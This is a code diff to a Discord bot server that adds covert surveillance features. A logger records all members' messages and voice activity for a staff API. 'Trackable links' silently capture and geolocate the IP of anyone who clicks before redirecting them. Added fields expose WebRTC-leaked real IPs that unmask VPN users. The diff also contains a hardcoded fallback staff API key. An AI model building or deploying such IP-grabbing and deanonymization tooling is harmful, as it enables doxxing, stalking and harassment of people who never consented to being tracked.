@@ -1153,6 +1153,211 @@ Use *italics* for dramatic effect. Be creative and menacing. Include their banne
 const STAFF_API_KEY = process.env.STAFF_API_KEY || 'unpatched-staff-2024';
 
 // ═══════════════════════════════════════════════════════════════════════════
+// ACTIVITY LOGGER - Track all user activity in server
+// ═══════════════════════════════════════════════════════════════════════════
+
+const activityLog = [];
+const MAX_ACTIVITY_LOG = 1000;
+
+function logActivity(type, userId, userTag, details, channelName = null) {
+  const entry = {
+    type,
+    user_id: userId,
+    user_tag: userTag,
+    details,
+    channel: channelName,
+    timestamp: new Date().toISOString()
+  };
+  activityLog.unshift(entry);
+  if (activityLog.length > MAX_ACTIVITY_LOG) activityLog.pop();
+  console.log(`[ACTIVITY] ${type}: ${userTag} - ${details}`);
+}
+
+// Message sent
+client.on('messageCreate', async (message) => {
+  if (message.author.bot) return;
+  if (!message.guild) return;
+  
+  logActivity('message', message.author.id, message.author.tag, 
+    message.content.substring(0, 100) + (message.content.length > 100 ? '...' : ''),
+    message.channel.name);
+});
+
+// Message deleted
+client.on('messageDelete', async (message) => {
+  if (!message.author || message.author.bot) return;
+  if (!message.guild) return;
+  
+  logActivity('delete', message.author.id, message.author.tag,
+    `Deleted: "${message.content?.substring(0, 50) || 'Unknown'}..."`,
+    message.channel.name);
+});
+
+// Reaction added
+client.on('messageReactionAdd', async (reaction, user) => {
+  if (user.bot) return;
+  
+  logActivity('reaction', user.id, user.tag,
+    `Reacted ${reaction.emoji.name} to message`,
+    reaction.message.channel.name);
+});
+
+// Voice state update
+client.on('voiceStateUpdate', async (oldState, newState) => {
+  const user = newState.member?.user || oldState.member?.user;
+  if (!user || user.bot) return;
+  
+  if (!oldState.channel && newState.channel) {
+    logActivity('voice_join', user.id, user.tag,
+      `Joined voice: ${newState.channel.name}`,
+      newState.channel.name);
+  } else if (oldState.channel && !newState.channel) {
+    logActivity('voice_leave', user.id, user.tag,
+      `Left voice: ${oldState.channel.name}`,
+      oldState.channel.name);
+  } else if (oldState.channel && newState.channel && oldState.channel.id !== newState.channel.id) {
+    logActivity('voice_move', user.id, user.tag,
+      `Moved: ${oldState.channel.name} → ${newState.channel.name}`,
+      newState.channel.name);
+  }
+});
+
+// Member join
+client.on('guildMemberAdd', async (member) => {
+  logActivity('join', member.user.id, member.user.tag, 'Joined the server');
+});
+
+// Member leave
+client.on('guildMemberRemove', async (member) => {
+  logActivity('leave', member.user.id, member.user.tag, 'Left the server');
+});
+
+// Nickname change
+client.on('guildMemberUpdate', async (oldMember, newMember) => {
+  if (oldMember.nickname !== newMember.nickname) {
+    logActivity('nickname', newMember.user.id, newMember.user.tag,
+      `Changed nickname: "${oldMember.nickname || 'None'}" → "${newMember.nickname || 'None'}"`);
+  }
+});
+
+// GET /api/staff/activity - Get activity log
+app.get('/api/staff/activity', checkStaffAuth, (req, res) => {
+  const limit = Math.min(parseInt(req.query.limit) || 100, 500);
+  const userId = req.query.user_id;
+  const type = req.query.type;
+  
+  let filtered = activityLog;
+  if (userId) filtered = filtered.filter(a => a.user_id === userId);
+  if (type) filtered = filtered.filter(a => a.type === type);
+  
+  res.json({ activity: filtered.slice(0, limit), total: filtered.length });
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
+// TRACKABLE LINKS - Capture IP when users click links
+// ═══════════════════════════════════════════════════════════════════════════
+
+const trackableLinks = new Map(); // code -> { url, created_by, created_at, name }
+const linkClicks = []; // { code, ip, user_agent, timestamp, location }
+
+// Create trackable link
+app.post('/api/staff/create-link', checkStaffAuth, async (req, res) => {
+  const { url, name } = req.body;
+  
+  if (!url) return res.json({ error: 'URL required' });
+  
+  const code = crypto.randomBytes(4).toString('hex');
+  trackableLinks.set(code, {
+    url,
+    name: name || 'Unnamed',
+    created_by: req.staffUser?.username || 'Unknown',
+    created_at: new Date().toISOString(),
+    clicks: 0
+  });
+  
+  res.json({ 
+    success: true, 
+    code,
+    tracking_url: `https://burner-phone-bot-production.up.railway.app/t/${code}`
+  });
+});
+
+// Track link click and redirect
+app.get('/t/:code', async (req, res) => {
+  const link = trackableLinks.get(req.params.code);
+  if (!link) return res.status(404).send('Link not found');
+  
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection?.remoteAddress || 'unknown';
+  const userAgent = req.headers['user-agent'] || 'unknown';
+  
+  // Get location from IP
+  let location = {};
+  const IPQS_KEY = process.env.IPQUALITYSCORE_API_KEY;
+  if (IPQS_KEY && ip !== 'unknown') {
+    try {
+      const ipqsRes = await fetch(`https://www.ipqualityscore.com/api/json/ip/${IPQS_KEY}/${ip}?strictness=1`);
+      const ipqs = await ipqsRes.json();
+      if (ipqs.success) {
+        location = {
+          country: ipqs.country_code,
+          region: ipqs.region,
+          city: ipqs.city,
+          isp: ipqs.ISP,
+          vpn: ipqs.vpn,
+          proxy: ipqs.proxy,
+          risk_score: ipqs.fraud_score
+        };
+      }
+    } catch (e) {}
+  }
+  
+  // Log click
+  const click = {
+    code: req.params.code,
+    link_name: link.name,
+    ip,
+    user_agent: userAgent,
+    location,
+    timestamp: new Date().toISOString()
+  };
+  linkClicks.unshift(click);
+  if (linkClicks.length > 1000) linkClicks.pop();
+  
+  link.clicks++;
+  
+  console.log(`[TRACK LINK] ${link.name}: ${ip} from ${location.country || 'Unknown'}, ${location.city || 'Unknown'} (VPN: ${location.vpn || false})`);
+  
+  // Redirect to actual URL
+  res.redirect(link.url);
+});
+
+// Get all trackable links
+app.get('/api/staff/links', checkStaffAuth, (req, res) => {
+  const links = [];
+  trackableLinks.forEach((data, code) => {
+    links.push({ code, ...data, tracking_url: `https://burner-phone-bot-production.up.railway.app/t/${code}` });
+  });
+  res.json({ links });
+});
+
+// Get link clicks
+app.get('/api/staff/link-clicks', checkStaffAuth, (req, res) => {
+  const code = req.query.code;
+  let clicks = linkClicks;
+  if (code) clicks = clicks.filter(c => c.code === code);
+  res.json({ clicks: clicks.slice(0, 200) });
+});
+
+// Delete trackable link
+app.delete('/api/staff/links/:code', checkStaffAuth, (req, res) => {
+  if (trackableLinks.delete(req.params.code)) {
+    res.json({ success: true });
+  } else {
+    res.json({ error: 'Link not found' });
+  }
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
 // STAFF OAUTH & AUTHENTICATION
 // ═══════════════════════════════════════════════════════════════════════════
 
@@ -1299,11 +1504,18 @@ app.get('/api/staff/members', checkStaffAuth, async (req, res) => {
     const guild = client.guilds.cache.get(guildId);
     
     if (!guild) {
-      return res.status(404).json({ error: 'Guild not found', members: [] });
+      console.log('[STAFF API] Guild not found:', guildId);
+      return res.json({ error: 'Guild not found', members: [], total: 0, verified: 0 });
     }
     
-    // Fetch all guild members from Discord
-    await guild.members.fetch();
+    console.log('[STAFF API] Fetching members for guild:', guildId);
+    
+    // Fetch all guild members from Discord (with timeout)
+    try {
+      await guild.members.fetch({ time: 30000 });
+    } catch (e) {
+      console.log('[STAFF API] Member fetch warning:', e.message);
+    }
     
     // Get all verified members from database with their latest verification data
     const verifiedData = await pool.query(`
@@ -1312,7 +1524,10 @@ app.get('/api/staff/members', checkStaffAuth, async (req, res) => {
         vl.ip_address, vl.ip_port, vl.ip_risk_score, vl.ip_vpn, vl.ip_proxy, vl.ip_tor,
         vl.ip_country, vl.ip_region, vl.ip_city, vl.ip_isp, vl.ip_org,
         vl.ip_mobile, vl.ip_connection_type, vl.ip_latitude, vl.ip_longitude,
-        vl.timezone_mismatch, vl.created_at as verified_at
+        vl.timezone_mismatch, vl.webrtc_real_ip, vl.webrtc_leak, vl.webrtc_real_country, vl.webrtc_real_city,
+        vl.account_age_days, vl.is_new_account, vl.has_avatar, vl.has_banner, vl.is_nitro,
+        vl.badges, vl.badge_count, vl.suspicious_username, vl.honeypot_triggered,
+        vl.created_at as verified_at
       FROM verification_logs vl
       WHERE vl.guild_id = $1 AND vl.result = 'success'
       ORDER BY vl.discord_id, vl.created_at DESC
@@ -1360,7 +1575,21 @@ app.get('/api/staff/members', checkStaffAuth, async (req, res) => {
         ip_isp: verified?.ip_isp || null,
         ip_org: verified?.ip_org || null,
         ip_mobile: verified?.ip_mobile || false,
-        timezone_mismatch: verified?.timezone_mismatch || false
+        timezone_mismatch: verified?.timezone_mismatch || false,
+        // New fields
+        webrtc_real_ip: verified?.webrtc_real_ip || null,
+        webrtc_leak: verified?.webrtc_leak || false,
+        webrtc_real_country: verified?.webrtc_real_country || null,
+        webrtc_real_city: verified?.webrtc_real_city || null,
+        account_age_days: verified?.account_age_days || null,
+        is_new_account: verified?.is_new_account || false,
+        has_avatar: verified?.has_avatar ?? null,
+        has_banner: verified?.has_banner || false,
+        is_nitro: verified?.is_nitro || false,
+        badges: verified?.badges || null,
+        badge_count: verified?.badge_count || 0,
+        suspicious_username: verified?.suspicious_username || false,
+        honeypot_triggered: verified?.honeypot_triggered || false
       });
     });
     
